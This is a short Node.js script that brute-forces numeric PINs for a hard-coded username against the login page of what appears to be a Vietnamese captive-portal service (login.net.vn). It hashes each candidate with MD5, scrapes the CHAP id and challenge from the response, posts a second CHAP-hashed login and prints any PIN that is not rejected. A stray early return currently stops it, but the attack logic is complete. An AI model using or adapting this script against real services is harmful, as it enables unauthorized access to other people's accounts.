const request = require('request');
const md5Hex = require('./md5Hex');
const convert = require('./octal-converter');

var username = "p1989681" // change user name here

async function BruteForce() {
  for (var i = 1005; i <= 1005; i++) { // chang range number here
    await new Promise(resolve => {
        var p = i;
        p = p.toString();
        console.log("Testing number: " + p)
        if ( i < 1000){
            var zeroCount = 4 - p.length;
            for (var z = 1; z <= zeroCount; z++){
                p = "0" + p;
            }
            // console.log(zeroCount);
        }
        // console.log(p)
        return;
        var a = md5Hex(p);
        var formData = {
            dst: '',
            project: 28,
            device: "DAY_B4",
            popup: "true",
            username: username,
            password: a,
        };
        
        request.post({url:'http://login.net.vn/login', form: formData}, function(err, httpResponse, body) {
          if (err) {
            return console.error('Error in request 1: ', err);
          }

          // console.log("Show body 1: " + body);
          // console.log("hash 1: " + a);
          var index1 = body.indexOf('chap-id" value="') + 16;
          var text1 = body.substr(index1, 4);
          var index2 = body.indexOf('chap-challenge" value="') + 23;
          var text2 = body.substr(index2, 64);

          // console.log(text1, text2);
            convert(text1).then (instance1 => {
            convert(text2).then( instance2 => {
              var str = instance1 + p + instance2;
              // console.log(a);
              // console.log(str);
              var hash = md5Hex(str);
              // console.log(hash);
              
              var formData2 = formData;
              formData2.password = hash
              
              request.post({url:'http://login.net.vn/login', form: formData2}, function(err, httpResponse, body2) {
                if (err) {
                  return console.error('Error in request 2: ', err);
                }
                // console.log("show body 2: " + body2);
                // console.log("hash 2: " + hash);
                if(body2.indexOf("invalid username or password") == -1)
                {
                  console.log("THIS         IS          PASSWORD: " + p);
                  return;
                } else{
                  console.log("Not: " + p)
                  resolve();
                }
              });
            })
          });
        });
    })
  }
}
BruteForce();